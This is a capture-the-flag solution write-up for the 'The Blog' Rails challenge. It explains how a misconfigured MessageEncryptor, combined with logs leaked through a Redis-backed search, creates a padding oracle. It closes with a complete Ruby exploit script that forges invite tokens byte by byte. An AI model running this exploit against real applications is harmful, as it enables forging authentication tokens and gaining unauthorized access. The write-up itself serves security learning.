# Solution

### The application

*The Blog* is a simple blogging platform. Registered users are allowed to upvote/downvote posts. Posts can only be written by the blog administrator. Registration is limited to users that are invited by the blog administrator.

### The "flag"

The objective of this challenge is to capture the "flag" — A hex token stored in an environment variable. This token is only returned [in response](https://github.com/mastahyeti/the-blog/blob/8306cc53e054587f4f4194ea41e63432927f506e/app/controllers/posts_controller.rb#L56) to the "vote" request. Because only registered users can vote, it follows that the challenge is to register an account. This involved obtaining an invite from the administrator.

### The invite

[Invites](https://github.com/mastahyeti/the-blog/blob/8306cc53e054587f4f4194ea41e63432927f506e/app/models/invite.rb) are cryptographic tokens generated using Rails' [`ActiveSupport::MessageEncryptor`](https://github.com/rails/rails/blob/9334223c51839addb5bbf7c61f33644f250999a1/activesupport/lib/active_support/message_encryptor.rb). *The Blog* is instantiating a `MessageEncryptor` instance like so:

```ruby
ActiveSupport::MessageEncryptor.new(
  Rails.application.config.crypto_key,
  'aes-256-cbc',
  serializer: JSON
)
```

This is the `initialize` method of `MessageEncryptor`:

```ruby
def initialize(secret, *signature_key_or_options)
  options = signature_key_or_options.extract_options!
  sign_secret = signature_key_or_options.first
  @secret = secret
  @sign_secret = sign_secret
  @cipher = options[:cipher] || 'aes-256-cbc'
  @verifier = MessageVerifier.new(@sign_secret || @secret, digest: options[:digest] || 'SHA1', serializer: NullSerializer)
  @serializer = options[:serializer] || Marshal
end
```

It seems that *The Blog* is attempting to specify the encryption algorithm in the second argument, but is in fact specifying the key `MessageEncryptor` will use for verifying signed messages. This means that an attacker can craft their own signed messages. These messages will be signed correctly, but decryption will fail because the attacker doesn't know the encryption secret.

At this point, the first thing that comes to mind is a padding oracle attack. *The Blog* is CBC encrypting without effectively MACing. Ideally, we would be able to send signed messages to *The Blog*, causing different exceptions based on whether the CBC padding is incorrect or the plaintext message is formatted incorrectly. Looking at [`MessageEncryptor#_decrypt`](https://github.com/rails/rails/blob/9334223c51839addb5bbf7c61f33644f250999a1/activesupport/lib/active_support/message_encryptor.rb#L83-L97), we see that it rescues from a variety of exception classes and re-raises a consistent exception to prevent such an attack:

```ruby
def _decrypt(encrypted_message)
  cipher = new_cipher
  encrypted_data, iv = encrypted_message.split("--").map {|v| ::Base64.strict_decode64(v)}

  cipher.decrypt
  cipher.key = @secret
  cipher.iv  = iv

  decrypted_data = cipher.update(encrypted_data)
  decrypted_data << cipher.final

  @serializer.load(decrypted_data)
rescue OpenSSLCipherError, TypeError, ArgumentError
  raise InvalidMessage
end
```

Looking back at *The Blog*'s instantiation of `MessageEncryptor` though, we see that it specifies a non-standard serializer — `JSON`. `MessageEncryptor` is calling `JSON.load` without rescuing from `JSON::ParserError` exceptions. This means that an incorrectly padded CT will result in a `InvalidMessage` exception, while an incorrectly formatted JSON PT will result in a `JSON::ParserError` exception.

This looks like an exploitable padding oracle vulnerability, except for the fact that the application isn't telling the user which type of exception it encountered.

### Logging

While exception classes aren't surfaced via the web interface, they are logged by the application. Looking at the [`Gemfile`](https://github.com/mastahyeti/the-blog/blob/8306cc53e054587f4f4194ea41e63432927f506e/Gemfile#L32), we seen that *The Blog* is using the [`logstash-logger`](https://github.com/dwbutler/logstash-logger) Gem for logging. In [`/config/application.rb`](https://github.com/mastahyeti/the-blog/blob/8306cc53e054587f4f4194ea41e63432927f506e/config/application.rb#L27), it is telling `LogStashLogger` to store logs in Redis. `LogStashLogger`'s Redis adaptor stores logs under the `logstash` redis key by [default](https://github.com/dwbutler/logstash-logger/blob/master/lib/logstash-logger/device/redis.rb#L6). If there were a way to read from this Redis list, we could determine the exception classes caused by forged invite tokens and exploit our padding oracle vulnerability.

### Search

*The Blog* allows users to search for blog posts. Looking again at the [`Gemfile`](https://github.com/mastahyeti/the-blog/blob/8306cc53e054587f4f4194ea41e63432927f506e/Gemfile#L24), we can see that search is implemented using the [`redis_search`](https://rubygems.org/gems/redis_search) Gem. This is not to be confused with the popular [`redis-search`](https://rubygems.org/gems/redis-search). Unpacking the `redis_search` Gem, we can see that it's pretty simple:

```ruby
require 'set'

class RedisSearch
  attr_reader :redis, :namespace

  # Public: Instantiate a new RedisSearch instance.
  #
  # opts - A Hash of options.
  #        :redis     - A Redis instance.
  #        :namespace - The String namespace for Redis keys.
  #
  # Returns nothing.
  def initialize(opts = {})
    @redis = opts[:redis]
    @namespace = opts[:namespace]
  end

  # Public: Index a document.
  #
  # id  - The ID of the document.
  # doc - The String document to index.
  #
  # Returns nothing.
  def index(id, doc)
    redis.pipelined do
      tokens(doc).uniq.each do |token|
        redis.lpush key(token), id
      end
    end
  end

  # Public: Search for a document.
  #
  # query - The String query.
  #
  # Returns an Array of matching document IDs.
  def search(query)
    redis.pipelined do
      tokens(query).uniq.each do |token|
        redis.lrange(key(token), -100, -1)
      end
    end.flatten.uniq
  end

  private
  # Private: Namespace a Redis key.
  #
  # token - The token to namespace.
  #
  # Returns a String.
  def key(token)
    [namespace, token].compact.join(':')
  end

  # Private: Tokenize a document or query.
  #
  # string - The String to tokenize.
  #
  # Returns an Array of String tokens.
  def tokens(string)
    string.scan(/\w+/)
  end
end
```

Indexed documents are tokenized. Each token is used as a Redis key for a list of the document IDs containing that token. Searches are similarly tokenized and the contents of each list is returned. The `posts#search` endpoint in *The Blog* searches for the user's query and [renders a link](https://github.com/mastahyeti/the-blog/blob/8306cc53e054587f4f4194ea41e63432927f506e/app/views/posts/search.html.erb) to each post it finds.

If one were to search for `logstash`, the results page would include all of the application's logs!

### Putting it all together

To forge a valid invite token for *The Blog*, an attacker needs to exploit the padding oracle vulnerability, searching for `logstash` for each attempt to find the class of the exception that was raised. Once an invite is forged, an account can be created and a post can be voted for, disclosing the "flag". Here's an exploit:

```ruby
require 'faraday'
require 'nokogiri'
require 'active_support'
require 'base64'
require 'json'
require 'securerandom'

LOG_URL = 'https://csaw2015-the-blog.herokuapp.com/posts/search?utf8=%E2%9C%93&q=logstash&commit=Search'
INVITE_URL = 'https://csaw2015-the-blog.herokuapp.com/users/new'
PADDING_EXCEPTION = "ActiveSupport::MessageEncryptor::InvalidMessage"
VERIFIER = ActiveSupport::MessageVerifier.new(
  'aes-256-cbc',
  digest: 'SHA1',
  serializer: ActiveSupport::MessageEncryptor::NullSerializer
)

def padding_error?(data)
  invite = generate_invite(data)
  eid = SecureRandom.hex
  res = Faraday.get INVITE_URL, invite: invite, eid: eid
  res.status == 500 && get_exception_class(eid) == PADDING_EXCEPTION
end

def generate_invite(data)
  iv = data[0].pack('C*')
  body = data[1..-1].flatten.pack('C*')
  VERIFIER.generate(
    [Base64.strict_encode64(body), Base64.strict_encode64(iv)].join('--')
  )
end

def get_exception_class(id)
  logs = get_logs

  # Find request that triggered exception.
  exception_request = logs.find_index do |l|
    l["params"] && l["params"]["eid"] == id
  end

  # Find exception.
  exception = logs[exception_request..-1].find do |l|
    l['severity'] == 'FATAL'
  end

  # Parse out the exception class.
  exception["message"].strip.split(/\s/).first
end

def get_logs
  html = Faraday.get(LOG_URL).body
  doc = Nokogiri.parse(html)
  doc.xpath('//li').map do |li|
    log_json = li.text.strip.gsub(/^Post\s*/, '')
    log = JSON.parse(log_json)
    if log["message"] =~ /^\s*Parameters:\s*(.*)/
      log["params"] = eval($1) # YOLO parsing Ruby Hash
    end
    log
  end
end

def blank(nblocks)
  return [] unless nblocks > 0
  nblocks.times.map { ([0] * 16) }
end

def xor(a, b)
  a.zip(b).map { |x, y| x ^ y }
end

payload = JSON.dump(uid: 1, nonce: '0123456789')
payload_bytes = payload.unpack('C*')
padding = 16 - payload_bytes.size % 16
padding = 16 if padding == 0
payload_bytes += [padding] * padding
payload_blocks = payload_bytes.each_slice(16).to_a

nblocks = payload_blocks.size + 1 # IV
ct_blocks = blank(nblocks)

(nblocks - 2).downto(0) do |iv_block_i|
  intermediate = [0] * 16
  15.downto(0) do |iv_byte_i|
    padding = 16 - iv_byte_i
    (0..255).each do |c_attempt|
      intermediate[iv_byte_i] = c_attempt
      iv_attempt = xor(intermediate, [padding] * 16)
      attempt = [*blank(iv_block_i), iv_attempt, ct_blocks[iv_block_i + 1]]
      break unless padding_error?(attempt)
      raise if c_attempt == 255
    end
    puts "done block #{iv_block_i} byte #{iv_byte_i}"
  end
  ct_blocks[iv_block_i] = xor(intermediate, payload_blocks[iv_block_i])
end

puts "Done!"
puts generate_invite ct_blocks
```

### :zap:

Props to [@eugeneius](https://github.com/eugeneius), the only person who figured this one out.
